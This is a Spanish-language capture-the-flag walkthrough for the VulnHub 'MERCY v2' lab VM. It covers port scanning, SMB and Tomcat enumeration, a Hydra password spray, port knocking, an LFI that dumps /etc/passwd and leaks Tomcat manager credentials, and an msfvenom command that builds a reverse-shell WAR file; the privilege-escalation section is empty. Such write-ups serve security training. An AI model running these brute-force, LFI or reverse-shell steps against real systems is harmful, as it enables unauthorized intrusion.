# MERCYv2
Desarrollo del CTF MERCERY V2


## 1. Configuración de la VM

- Download: https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/

## 2. Escaneo de Puertos

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.00078s latency).
Not shown: 65525 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3        Dovecot pop3d
|_pop3-capabilities: CAPA SASL AUTH-RESP-CODE RESP-CODES PIPELINING UIDL TOP STLS
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: more IMAP4rev1 ID have LITERAL+ Pre-login post-login LOGIN-REFERRALS listed capabilities OK LOGINDISABLEDA0001 IDLE ENABLE SASL-IR STARTTLS
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imaps?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
995/tcp  open     ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-title: Apache Tomcat
MAC Address: 00:0C:29:0E:13:4F (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2h39m58s, deviation: 4h37m07s, median: 0s
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2021-03-22T01:34:28+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-21T17:34:28
|_  start_date: N/A
```

- Llama la atención TCP/80 y TCP/22 que aparecen como FILTERED. Un probable PORT KNOCKING.

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy1.jpg" width=80% />


## 3. Enumeración

- Iniciamos la enumeración. Los puertos IMAP y POP3 no me brindó información importante.

### 3.1. Enumeración NETBIOS

- Identificamos la carpeta QIU compartida en el servidor.

```
root@kali:~/MERCY# smbclient -L \\10.10.10.143 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	qiu             Disk      
	IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))

```

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy2.jpg" width=80% />

- El ENUM4LINUX nos brinda información interesante de usuarios (el resultado es muy grande, coloco lo mas importante)

```
 ============================= 
|    Users on 10.10.10.143    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy	Name: QIU	Desc: 
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu	Name: 	Desc: 

user:[pleadformercy] rid:[0x3e8]
user:[qiu] rid:[0x3e9]
	User Name   :	qiu
	Full Name   :	
	Home Drive  :	\\mercy\qiu
	Dir Drive   :	
	Profile Path:	\\mercy\qiu\profile
  
  User Name   :	pleadformercy
	Full Name   :	QIU
	Home Drive  :	\\mercy\pleadformercy
	Dir Drive   :	
	Profile Path:	\\mercy\pleadformercy\profile

S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.

S-1-22-1-1003 Unix User\fluffy (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.
```

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy3.jpg" width=80% />

> En resumen tenemos: 04 usuarios identificados (qiu, pleadformercy, thisisasuperduperlonguser, fluffy) y una carpeta compartida (qiu).


### 3.2. Enumeración de TOMCAT

- Buscamos archivos en el servidor web TOMCAT.

```
root@kali:~/MERCY# nikto -h http://10.10.10.143:8080/ 

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.143
+ Target Hostname:    10.10.10.143
+ Target Port:        8080
+ Start Time:         2021-03-21 15:55:31 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ 8170 requests: 0 error(s) and 13 item(s) reported on remote host
```

- Encontramos el archivo robots.txt, dentro un mensaje en BASE64. 

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy4.jpg" width=80% />

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy5.jpg" width=80% />

- El mensaje nos indica que han encontrado contraseñas del tipo "password". Una pista.

- También identificamos carpetas por defecto en TOMCAT. Nada importante.

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy6.jpg" width=80% />

## 4. Explotando la Vulnerabilidad

- Tenemos 04 usuarios y el posible uso de la contraseña "password". Tenemos varios protocolos donde probar: TOMCAT MANAGER, SMB, IMAP, POP3.

### 4.1. Acceso por SMB

```
root@kali:~/MERCY# hydra -V -L users.txt -P pass.txt smb://10.10.10.143
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-22 19:49:49
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 12 login tries (l:4/p:3), ~12 tries per task
[DATA] attacking smb://10.10.10.143:445/
[ATTEMPT] target 10.10.10.143 - login "qiu" - pass "password" - 1 of 12 [child 0] (0/0)
[445][smb] host: 10.10.10.143   login: qiu   password: password
[ATTEMPT] target 10.10.10.143 - login "pleadformercy" - pass "password" - 4 of 12 [child 0] (0/0)
[ATTEMPT] target 10.10.10.143 - login "pleadformercy" - pass "password123" - 5 of 12 [child 0] (0/0)
[ATTEMPT] target 10.10.10.143 - login "pleadformercy" - pass "P@ssw0rd" - 6 of 12 [child 0] (0/0)
[ATTEMPT] target 10.10.10.143 - login "thisisasuperduperlonguser" - pass "password" - 7 of 12 [child 0] (0/0)
[445][smb] Host: 10.10.10.143 Account: thisisasuperduperlonguser Error: Invalid account (Anonymous success)
[ATTEMPT] target 10.10.10.143 - login "fluffy" - pass "password" - 10 of 12 [child 0] (0/0)
[ATTEMPT] target 10.10.10.143 - login "fluffy" - pass "password123" - 11 of 12 [child 0] (0/0)
[ATTEMPT] target 10.10.10.143 - login "fluffy" - pass "P@ssw0rd" - 12 of 12 [child 0] (0/0)
```

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy7.jpg" width=80% />


- Identificamos los accesos qiu:user, vamos a probar el acceso a la carpeta qiu que habiamos identificado en la enumeración.

```
root@kali:~/MERCY# smbmap -H 10.10.10.143 -u qiu -p password -R qiu
[+] IP: 10.10.10.143:445	Name: 10.10.10.143                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	qiu                                               	READ ONLY	
	.\qiu\*
	dr--r--r--                0 Fri Aug 31 15:07:00 2018	.
	dr--r--r--                0 Mon Nov 19 11:59:09 2018	..
	fr--r--r--             3637 Sun Aug 26 09:19:34 2018	.bashrc
	dr--r--r--                0 Sun Aug 26 10:23:24 2018	.public
	fr--r--r--              163 Fri Aug 31 15:11:34 2018	.bash_history
	dr--r--r--                0 Fri Aug 31 14:22:05 2018	.cache
	dr--r--r--                0 Sun Aug 26 12:35:34 2018	.private
	fr--r--r--              220 Sun Aug 26 09:19:34 2018	.bash_logout
	fr--r--r--              675 Sun Aug 26 09:19:34 2018	.profile
	.\qiu\.public\*
	dr--r--r--                0 Sun Aug 26 10:23:24 2018	.
	dr--r--r--                0 Fri Aug 31 15:07:00 2018	..
	dr--r--r--                0 Sun Aug 26 10:24:21 2018	resources
	.\qiu\.public\resources\*
	dr--r--r--                0 Sun Aug 26 10:24:21 2018	.
	dr--r--r--                0 Sun Aug 26 10:23:24 2018	..
	fr--r--r--               54 Sun Aug 26 10:24:21 2018	smiley
	.\qiu\.cache\*
	dr--r--r--                0 Fri Aug 31 14:22:05 2018	.
	dr--r--r--                0 Fri Aug 31 15:07:00 2018	..
	fr--r--r--                0 Fri Aug 31 14:22:05 2018	motd.legal-displayed
	.\qiu\.private\*
	dr--r--r--                0 Sun Aug 26 12:35:34 2018	.
	dr--r--r--                0 Fri Aug 31 15:07:00 2018	..
	dr--r--r--                0 Thu Aug 30 12:36:50 2018	opensesame
	fr--r--r--               94 Sun Aug 26 10:22:35 2018	readme.txt
	dr--r--r--                0 Mon Nov 19 12:01:09 2018	secrets
	.\qiu\.private\opensesame\*
	dr--r--r--                0 Thu Aug 30 12:36:50 2018	.
	dr--r--r--                0 Sun Aug 26 12:35:34 2018	..
	fr--r--r--              539 Thu Aug 30 12:39:14 2018	configprint
	fr--r--r--            17543 Fri Aug 31 15:11:56 2018	config
```

- Dentro de la carpeta PRIVATE y OPENSESAME hay un archivo CONFIG interesante. Contiene la configuración de un PORT NOCK.

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy8.jpg" width=80% />

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy9.jpg" width=80% />

### 4.2. Abiendo los puertos PORT NOCK

- Vamos abrir los puertos TCP/80 y TCP/22.

```
root@kali:~/MERCY# knock 10.10.10.143 159 27391 4
root@kali:~/MERCY# knock 10.10.10.143 17301 28504 9999
root@kali:~/MERCY# nmap -n -P0 -p 22,80 -sV 10.10.10.143
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 20:05 EDT
Nmap scan report for 10.10.10.143
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 00:0C:29:0E:13:4F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy10.jpg" width=80% />


### 4.3. Enumeración de TCP/80 

- Nos toca enumerar nuevamente, esta vez con el puerto TCP/80 abierto. GOBUSTER, DIRSEARCH y NIKTO, lo básico.

```
root@kali:~/MERCY/autorecon2/10.10.10.143/scans# cat tcp_80_http_gobuster.txt 
/.hta (Status: 403) [Size: 283]
/.hta.txt (Status: 403) [Size: 287]
/.hta.html (Status: 403) [Size: 288]
/.hta.php (Status: 403) [Size: 287]
/.hta.asp (Status: 403) [Size: 287]
/.hta.aspx (Status: 403) [Size: 288]
/.hta.jsp (Status: 403) [Size: 287]
/.htaccess (Status: 403) [Size: 288]
/.htaccess.html (Status: 403) [Size: 293]
/.htaccess.php (Status: 403) [Size: 292]
/.htaccess.asp (Status: 403) [Size: 292]
/.htaccess.aspx (Status: 403) [Size: 293]
/.htaccess.jsp (Status: 403) [Size: 292]
/.htaccess.txt (Status: 403) [Size: 292]
/.htpasswd (Status: 403) [Size: 288]
/.htpasswd.txt (Status: 403) [Size: 292]
/.htpasswd.html (Status: 403) [Size: 293]
/.htpasswd.php (Status: 403) [Size: 292]
/.htpasswd.asp (Status: 403) [Size: 292]
/.htpasswd.aspx (Status: 403) [Size: 293]
/.htpasswd.jsp (Status: 403) [Size: 292]
/index.html (Status: 200) [Size: 90]
/index.html (Status: 200) [Size: 90]
/login.html (Status: 200) [Size: 67]
/robots.txt (Status: 200) [Size: 50]
/robots.txt (Status: 200) [Size: 50]
/server-status (Status: 403) [Size: 292]
/time (Status: 200) [Size: 79]


root@kali:~/MERCY/autorecon2/10.10.10.143/scans# cat tcp_80_http_nikto.txt 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.143
+ Target Hostname:    10.10.10.143
+ Target Port:        80
+ Start Time:         2021-03-21 15:54:54 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /mercy/: Directory indexing found.
+ Entry '/mercy/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Cookie stylesheet created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.25
+ Entry '/nomercy/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 5a, size: 5745661f170dc, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.html: Admin login page/section found.
```

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy11.jpg" width=80% />

- Encontramos lo siguiente: robots.txt, la carpeta /mercy/ y /nomercy/, la fecha en /time

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy12.jpg" width=80% />

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy13.jpg" width=80% />


### 4.3. Explotando RIPS

- Aunque era algo casi obvio, lo mas probable era que RIPS (la aplicacion en la carpeta /nomercy/) tuviera alguna vulnerabilidad.
- Buscamos en EXPLOIT-DB.COM e identificamos un LFI (Local File Inclusion).

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy14.jpg" width=80% />

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy15.jpg" width=80% />

```
<? root:x:0:0:root:/root:/bin/bash
<? daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<? bin:x:2:2:bin:/bin:/usr/sbin/nologin
<? sys:x:3:3:sys:/dev:/usr/sbin/nologin
<? sync:x:4:65534:sync:/bin:/bin/sync
<? games:x:5:60:games:/usr/games:/usr/sbin/nologin
<? man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<? lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
<? mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<? news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<? uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
<? proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
<? www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<? backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<? list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
<? irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
<? gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
<? nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
<? libuuid:x:100:101::/var/lib/libuuid:
<? syslog:x:101:104::/home/syslog:/bin/false
<? landscape:x:102:105::/var/lib/landscape:/bin/false
<? mysql:x:103:107:MySQL Server,,,:/nonexistent:/bin/false
<? messagebus:x:104:109::/var/run/dbus:/bin/false
<? bind:x:105:116::/var/cache/bind:/bin/false
<? postfix:x:106:117::/var/spool/postfix:/bin/false
<? dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
<? dovecot:x:108:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
<? dovenull:x:109:120:Dovecot login user,,,:/nonexistent:/bin/false
<? sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
<? postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
<? avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
<? colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
<? libvirt-qemu:x:114:108:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
<? libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
<? tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
<? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
<? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
<? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
<? fluffy:x:1003:1003::/home/fluffy:/bin/sh 
```

- Toca automatizar la búsqueda de información importante a través de LFI. Desde el inicio el TOMCAT me parecia una manera de ganar acceso a través de TOMCAT MANAGER.
- Busqué la RUTA por defecto del archivo de configuración del TOMCAT MANAGER y encontré la contraseña.

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy16.jpg" width=80% />


### 4.4. Accediendo a TOMCAT MANAGER

- Colocamos las credenciales en http://10.10.10.143:8080/manager/html thisisasuperduperlonguser:heartbreakisinevitable

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy17.jpg" width=80% />

- Subimos nuestra webshell y obtenemos conexión reversa.

```
root@kali:~/MERCY# msfvenom -p java/shell/reverse_tcp LHOST=10.10.10.133 LPORT=443 -f war -o reverse.war
Payload size: 6252 bytes
Final size of war file: 6252 bytes
Saved as: webshell.war
```

<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy18.jpg" width=80% />


## 5. Elevando Privilegios






























